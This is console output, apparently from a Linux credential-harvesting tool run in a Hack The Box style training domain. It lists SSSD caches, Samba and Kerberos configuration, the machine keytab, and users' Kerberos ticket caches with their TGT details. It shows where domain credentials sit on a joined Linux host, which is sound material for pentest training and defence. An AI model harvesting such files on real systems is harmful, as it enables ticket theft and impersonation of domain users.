-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
```

